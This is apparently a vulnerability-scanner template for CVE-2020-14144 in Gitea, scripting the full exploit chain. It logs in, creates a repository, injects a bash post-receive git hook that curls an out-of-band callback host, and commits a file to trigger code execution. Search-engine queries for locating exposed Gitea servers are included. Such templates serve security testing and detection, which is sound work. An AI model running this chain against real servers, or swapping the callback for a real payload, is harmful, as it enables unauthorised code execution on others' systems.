http:
- extractors:
  - group: 1
    internal: true
    name: csrf
    regex:
    - name="_csrf" value="(.*)"
    type: regex
  - group: 1
    internal: true
    name: auth_csrf
    regex:
    - name="_csrf" content="(.*)"
    type: regex
  - group: 1
    internal: true
    name: last_commit
    regex:
    - name="last_commit" value="(.*)"
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: body_1
    type: word
    words:
    - 'Gitea:'
  matchers-condition: and
  raw:
  - 'GET /user/login HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /user/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    _csrf={{csrf}}&user_name={{username}}&password={{url_encode(password)}}

    '
  - 'GET /repo/create HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /repo/create HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    _csrf={{auth_csrf}}&uid=1&repo_name={{randstr}}&private=on&description=&repo_template=&issue_labels=&gitignores=&license=&readme=Default&auto_init=on&default_branch=master

    '
  - 'POST /{{username}}/{{randstr}}/settings/hooks/git/post-receive HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    _csrf={{auth_csrf}}&content=%23%21%2Fbin%2Fbash%0D%0Acurl+{{interactsh-url}}

    '
  - 'GET /{{username}}/{{randstr}}/_new/master HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /{{username}}/{{randstr}}/_new/master HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    _csrf={{auth_csrf}}&last_commit={{last_commit}}&tree_path=test.txt&content=test&commit_summary=&commit_message=&commit_choice=direct

    '
id: CVE-2020-14144
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:gitea:gitea:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-14144
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.2
    cwe-id: CWE-78
    epss-percentile: 0.99803
    epss-score: 0.93388
  description: 'Gitea 1.1.0 through 1.12.5 is susceptible to authenticated remote
    code execution, via the git hook functionality, in customer environments where
    the documentation is not understood (e.g., one viewpoint is that the dangerousness
    of this feature should be documented immediately above the ENABLE_GIT_HOOKS line
    in the config file). NOTE: The vendor has indicated this is not a vulnerability
    and states "This is a functionality of the software that is limited to a subset
    of accounts. If you give someone the privilege to execute arbitrary code on your
    server, they can execute arbitrary code on your server. We provide very clear
    warnings to users around this functionality and what it provides."

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the target system.

    '
  metadata:
    fofa-query:
    - body="powered by gitea version"
    - title="gitea"
    google-query: intitle:"gitea"
    max-request: 7
    product: gitea
    shodan-query:
    - html:"Powered by Gitea Version"
    - http.html:"powered by gitea version"
    - http.title:"gitea"
    - cpe:"cpe:2.3:a:gitea:gitea"
    vendor: gitea
    verified: true
  name: Gitea 1.1.0 - 1.12.5 - Remote Code Execution
  reference:
  - https://dl.gitea.io/gitea/1.16.6
  - https://github.com/go-gitea/gitea/pull/13058
  - https://www.fzi.de/en/news/news/detail-en/artikel/fsa-2020-3-schwachstelle-in-gitea-1125-und-gogs-0122-ermoeglicht-ausfuehrung-von-code-nach-authent/
  - https://nvd.nist.gov/vuln/detail/CVE-2020-14144
  - https://docs.github.com/en/enterprise-server@2.19/admin/policies/creating-a-pre-receive-hook-script
  remediation: Fixed in version 1.16.7.
  severity: high
  tags: cve2020,cve,rce,gitea,authenticated,git,intrusive,vuln
